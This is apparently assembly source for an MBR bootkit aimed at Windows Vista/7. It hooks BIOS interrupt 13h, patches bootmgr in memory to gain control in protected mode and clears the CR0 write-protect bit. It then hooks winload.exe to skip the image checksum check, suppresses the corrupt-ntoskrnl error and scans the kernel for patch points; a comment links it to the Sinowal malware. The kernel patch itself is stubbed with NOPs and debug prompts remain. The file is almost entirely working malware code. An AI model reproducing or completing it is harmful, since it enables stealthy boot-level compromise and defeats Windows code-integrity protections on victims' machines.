; this code will be loaded in 0x7e00
[bits 16]
CPU 386 
org 00h

; save all regs before execute the origin code
pushad

; allocate 4096 bytes for the interrupt 13h background service
mov si,0413h    ; using "base memory size in KB" of BIOS Data Area (0040h:0013h)
sub [si],word 4  ; 4096 bytes
lodsw  ;  
shl ax,6  ; * 1024 / 16
mov es,ax   ; store segment address
xor di,di   ; offset

; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
mov si,7e00h
mov ecx,Total_End_of_Binary
rep movsb

; backup old int 13h vector
mov eax,[13h * 4]     ; backup IVT vector 13h
mov [es:Forward_Interrupt_13h_Original + 1],eax   ; store the old jump address

; hook int 13h
mov [13h * 4],word Interrupt_13h_Hook  ; new address to jump to on "int 13h" instruction
mov [13h * 4 + 2],es     ; set segment to jump to on int 13h

mov si,Stage_0_Message
add si, 7e00h
call Print_Text
call wait_key
popad

execute_origin_mbr:
; this will execute the origin mbr 
jmp 0000h:7c00h

; prints the text given in si
Print_Text:
 pushad
pushf
mov bx,0007h                                    ; Page Number = 0, Attribute = 07h
mov ah,0Eh                                      ; Function 0Eh: Teletype Output

cs lodsb                                        ; load the first character

Next_Char:
int 10h
cs lodsb                                        ; al = next character
or al,al                                        ; last letter?
jnz Next_Char                                   ; if not print next letter
popf
popad
ret

Stage_0_Message                 db      '^____^  press any key to continue:',13,10, 0
Bootmgr_sign_found_Message                 db      'Bootmgr_sign_found press any key to patch SU module to gain control in protect mode:',13,10, 0
Interrupt_13h_Message          db      'Interrupt_13h call',13,10, 0

Forward_Interrupt_13h_Original:
; jump to the original interrupt 13h handler (segment:offset will be patched dynamically)
jmp word 0000h:0000h

; now our background "service" starts, we get control only by int 13
; the code is now located at the end of memory (most likely 9F400h)
;direct declare string for print will crash because this code wille be relocate.
Interrupt_13h_Hook:
; backup cpu ctx
    pushad
    pushf
    cmp ah,42h                                                                      ; Extended Read?
    jz read_handler
    cmp ah,02h                                                                      ; Read?
    jnz exit_and_call_origin
read_handler:
    mov si,Interrupt_13h_Message
    call Print_Text

; restore cpu ctx
    popf
    popad
    push ax; save the cmd
    ; simulate interrupt instruction
    pushfw
    push cs
    call word Forward_Interrupt_13h_Original
    jc read_fail_handler

    ; read disk ok,   need more handle so save the result
    pushad ; 32
    pushf ; 2

    push ds  ; 2 data segment register will be modified to access this modules data
    push es; 2

    mov di,bx    ; di will store target buffer
    mov bp,sp
    cmp byte [bp+ 38], 02h
    jz Parameters_Normalized
    mov cx,[si+0x2]  ;get sector count
    les di,[si+0x4] ; get buffer
    Parameters_Normalized:
    shl cx,9 ; number of bytes = sector count * 512
    cld

    ; skip scan if bootmgr already patched.
    ;test [cs:Configuration_Bits],byte 00001000b 
    ;jnz bootmgr_already_patched

    ; now scan the read buffer for a signature in bootmgr
    ;   + 8A 46 ?? 98 3D 00 00 75 03 E9 03 00 E9 35 00
    ;     Windows Vista/7 bootmgr at address 06F2h
    ; patch applied: hooking code to call protected mode part
    ;   000205ec:  mov al, byte ptr ss:[bp+0xfff6]  ; 8a46f6    ->    call far 0020:0009f5c4    ; 669ac4f509002000
    ;   000205ef:  cbw                              ; 98        ->    
    ;   000205f0:  cmp ax, 0x0000                   ; 3d0000    ->    
    ;   000205f3:  jnz .+0x0003                     ; 7503      ->      (nop)                   ; 90
    ;   000205f5:  jmp .+0x0003                     ; e90300    ->    jmp .+0x0003              ; e90300
    ;   000205f8:  jmp .+0x0035                     ; e93500    ->    jmp .+0x0035              ; e93500
    Search_Signature_3:
    mov al,8Ah
    repne scasb
    jnz read_ok_handler                                                     ; if not found => exit
    cmp byte [es:di],0x46
    jnz Search_Signature_3
    cmp dword [es:di+2],00003D98h
    jnz Search_Signature_3
    cmp dword [es:di+6],03E90375h
    jnz Search_Signature_3
    cmp dword [es:di+10],0035E900h
    jnz Search_Signature_3

    ; apply patch:
    ;   + 66 9A ADDRESS 20 90
    Found_Signature_bootmgr:
    or [cs:Configuration_Bits],byte 00001000b 
    dec di
    mov si,Bootmgr_sign_found_Message
    call Print_Text
    call wait_key
    ;jmp read_ok_handler
   ;jmp Remove_Interrupt_13h_Hook
    
    ; do patch work
    mov word [es:di],0x9A66   ; patch something
    xor eax,eax
    mov ax,cs
    shl eax,4
    add eax,Entry_Point_OS_Vista
    mov [es:di+0x2],eax 
    mov word [es:di+0x6],0x20  
    mov byte [es:di+0x8],0x90 

;Remove_Interrupt_13h_Hook:
    ;mov eax,[Forward_Interrupt_13h_Original+1]   ; offset of original int 13h
   ; xor bx,bx
    ;mov ds,bx
  ;  mov [13h * 4],eax               ; restore interrupt 13h vector (reset offset)

bootmgr_already_patched:
read_ok_handler:
pop es   ; restore all register contents as it was before this hook
pop ds
popf
popad
mov ah,0
read_fail_handler:
    add sp, 2 ; pop the cmd
    retf 2

exit_and_call_origin:
    popf
    popad
    jmp Forward_Interrupt_13h_Original

Configuration_Bits    db  00000000b

wait_key:
pushad
pushf
xor ah,ah                                       ; Function 00h: Get Keystroke
int 16h
popf
popad
ret

; protected code start called by bootmgr SU module
[bits 32]
Entry_Point_OS_Vista:
nop
nop
nop
nop
pushad
push es
push ds

; we need to set correct segment register (this is also why this function was far called)
;   cs:s=0x0020, dh=0x00cf9a00, dl=0x0000ffff, valid=1
;   ds:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   ss:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=7
;   es:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   fs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   gs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
;   ldtr:s=0x0000, dh=0x00008200, dl=0x0000ffff, valid=0
;   tr:s=0x0040, dh=0x00008b02, dl=0x48a00077, valid=1
;   gdtr:base=0x0001f000, limit=0x7f
;   idtr:base=0x0001f080, limit=0x7ff
mov eax,0x30   ; set to 30h, Data Segment
mov es,ax
mov ds,ax
; scan OS Loader (32 bit executable embedded in bootmgr) for a signature
mov edi,00400000h   ; OS Loader base
mov ecx,960 * 1024 
call dword Get_Current_EIP_2
Get_Current_EIP_2:
pop esi
add esi,Relocate_Me_Code - Get_Current_EIP_2
call dword Hook_WinloadExe

pop ds   ; restore them
pop es
popad
retf

; 加载的第一个pe 是 bootmgr.exe.mui
FakeImgpLoadPEImage:
; 1. called by OSLOADER resisting in bootmgr 
; 2. return address is 0x4216a8
; 3. ebx(0x2700c0 the pe file header   )
call dword Obfuscation_Function

; move return eip to the "successful branch" (skip the STATUS_IMAGE_CHECKSUM_MISMATCH)
; _text:004216A2 3B 43 58                                cmp     eax, [ebx+58h]
; _text:004216A5 74 18                                   jz      short loc_4216BF
; C7 45 F8 21 02 00 C0    mov     [ebp+var_8], 0C0000221h ; STATUS_IMAGE_CHECKSUM_MISMATCH
movsx eax,byte [esi+4] ; esi = Relocate_Me_Code, get jump offset of original code from the backup
dec eax ; -1 because call [address] used 1 more byte
add [esp+0x2c],eax ; return eip (2Ch = pushad 32 + pushfd 4  + push eax 4 + call dword Obfuscation_Function 返回地址
; xchg 替换成了 ebx 即 pe file header)

; why ??????????????????????????????????????
; get caller's eax register
lea edx,[edi+0x6]    ; original return address + 6 指令被截断了,需要跳过剩下的6 字节
movzx eax,byte [esi+0x1]  ; register (eax, 43) of compare opcode
not al     ; = BCh
and al,00000111b        ; = 04h
add al,2        ; = 06h
mov edi,[esp+eax*4]      ; stack + 6*4  =>  get ebx register..

; valid PE Image?
cmp dword [edi],'PE' ; verify PE Signature
jnz Exit_FakeImgpLoadPEImage
cmp word [edi+0x18],010Bh  ; 010Bh, Magic Number (PE32)
jnz Exit_FakeImgpLoadPEImage

; scan bootmgr.exe.mui for removing code integrity check, again (shouldn't appear anyway)
mov ecx,[edi+0x50]  ; SizeOfImage
and edi,0FFFFF000h  ; page base address of PE Image
call dword Hook_WinloadExe
jz Exit_FakeImgpLoadPEImage

; find the signature in ntoskrnl and patch the code
call Find_Ntoskrnl_Code_Pattern
;jz Patch_Kernel_Code_Vista   ; if found, patch!
Exit_FakeImgpLoadPEImage:
jmp Obfuscation_Return ; return to Windows

Patch_Kernel_Code_Vista:
nop
nop

Find_Ntoskrnl_Code_Pattern:
; Input
;   ecx = SizeOfImage
;   edi = Image
; return value ebx = pointer to code pattern with startin code E8 (= relative call opcode)
; return status zero flag = 1 found
push ecx
push edi

; scan ntoskrnl.exe for code patterns [+ for Vista]:
;   +  6A 4B 6A 19 / 6A 19 6A 4B
;     ntoskrnl.1CE87E0h
;			memory.0x80683ec9
Scan_Pattern_Ntoskrnl:
mov al,0x6a
repne scasb
jnz Find_Ntoskrnl_Code_Pattern_Exit
cmp dword [edi-0x1],0x196A4B6A
jz Signature_1_Found
cmp dword [edi-0x1],0x4B6A196A
jnz Scan_Pattern_Ntoskrnl  ; if not equal => continue search
inc edi   ; weird signature
Signature_1_Found:
cmp byte [edi+0x3],0x89    ; 2 possible valid signatures
jnz No_Extended_Signature
add edi,byte +0x6
No_Extended_Signature:
cmp byte [edi+0x3],0xe8
jnz Scan_Pattern_Ntoskrnl

; first pattern found, scan for next [same as in previous Sinowal version] signature:
;   + E8 ?? ?? ?? ?? 84 C0
;     ntoskrnl.1CE87F3h						ntoskrnl.1CE87F8h
;			memory.0x80683ed8						memory.0x80683EDD
lea ebx,[edi+0x8]
xchg ebx,edi
mov al,0xe8
repne scasb
jnz Find_Ntoskrnl_Code_Pattern_Exit
cmp word [edi+0x4],0xc084
xchg ebx,edi
jnz Scan_Pattern_Ntoskrnl

Find_Ntoskrnl_Code_Pattern_Exit:
pop edi
pop ecx
ret

Obfuscation_Function:
; [stack + 0] = address to jump to
; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2

; Output:
; esi = pointer to Relocate_Me_Code
; edi = pointer to return code of Windows / Argument 2

; during execution all memory access is possible is cr0.wp cleared
; return by jumping to Obfuscation_Return

pushad   ; +32
pushfd     ; +4
cld

; clear cr0.Write Protect flag (to allow writing into read-only user pages)
mov eax,cr0
push eax ; +4
and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows

; set parameters and call
; the pe file header
xchg ebx,[esp+0x28]   ; ebx = return eip  
mov edi,[esp+0x2c]   ; edi = return address to Windows /Argument 2
call dword Get_Current_EIP_0
Get_Current_EIP_0:
pop esi ; esi = eip
sub esi,Get_Current_EIP_0 - Relocate_Me_Code   ; set esi to Relocate_Me_Code absolute address
jmp ebx   ; jump

; restore cr0.wp
Obfuscation_Return:
pop eax
mov cr0,eax   ; everything done fine, restore it and give control back to Windows

popfd
popad
pop ebx ; exchange the value back
ret             

Relocate_Me_Code:
nop
nop
nop
nop
nop
nop
Hook_Address    dd  0

Hook_WinloadExe:
; Input
;   esi = address of Relocate_Me_Code
;   edi = address of memory to scan
;   ecx = bytes to scan
; Output
; zf  0 if bootmgr.exe bootmgr.exe.mui   winload.exe has been succssful patched.
push ecx
push edi

; scan winload for some jump offset in _ImgpLoadPEImage@36  
;   + 3B ?? 58 74 ?? C7
; patch applied: winload.exe will be hooked
;   0041e8c0:  cmp eax, dword ptr ds:[ebx+0x58]         ; 3b4358            ->      call [address]
;   0041e8c3:  jz .+0x0000000c                          ; 740c              ->
;   0041e8c5:  mov dword ptr ss:[ebp+0x8], 0xc0000221   ; c74508210200c0    (STATUS_IMAGE_CHECKSUM_MISMATCH)
Search_Unknown_Signature:
mov al,0x3b
repne scasb
jnz Hook_WinloadExe_Exit
cmp word [edi+0x1],0x7458
jnz Search_Unknown_Signature
cmp byte [edi+0x4],0xC7
jnz Search_Unknown_Signature

; backup 6 bytes to overwrite them with custom code
; break in 0x9edf5
dec edi                                                                         ; -1 to get to start of signature
mov eax,[edi]                                                                   ; copy 4 bytes
mov [esi],eax
mov ax,[edi+4]                                                                  ; copy 2 bytes
mov [esi+4],ax

; store new code: FF 15 + address  (call hook)
mov ax,0x15FF  ; FF 15, opcodes of call [address]
stosw          
lea eax,[esi - (Relocate_Me_Code - FakeImgpLoadPEImage)]   ; get offset of hook code
mov [es:esi+6],eax ; set the Hook_Address variable
lea eax,[esi+6]   ; get address of variable address, used for call [address]
stosd 

; restore (and store) register contents for searching the next signature
pop edi
pop ecx
push ecx
push edi

; scan winload for the code that puts ntoskrnl corrupt error status
;   + 8B F0 85 F6 75   and value 0C0000098h
; 8B F0 85 F6 75 ?? ?? 980000c0
; patch applied: STATUS_FILE_INVALID error code will be overwritten
;   0041f076:  lock test esi, esi        ; f085f6
;   0041f079:  jnz .+0x0000000a          ; 750a
;   0041f07b:  mov eax, 0xc0000098       ; b8980000c0   ->    mov eax,0
Search_Ntoskrnl_Error_Code:
mov al,0x8b
repne scasb
jnz Hook_WinloadExe_Exit
cmp dword [edi],0x75f685F0
jnz Search_Ntoskrnl_Error_Code
cmp dword [edi+0x6],0xC0000098  ; ntoskrnl.exe missing or corrupt (Error 0xC0000098), STATUS_FILE_INVALID
jnz Search_Ntoskrnl_Error_Code
mov dword [edi+0x6],0x0      ;  set ret value to  STATUS_SUCCESS

Hook_WinloadExe_Exit:
pop edi
pop ecx
ret

Total_End_of_Binary:
times 4*1024-($-$$) db 0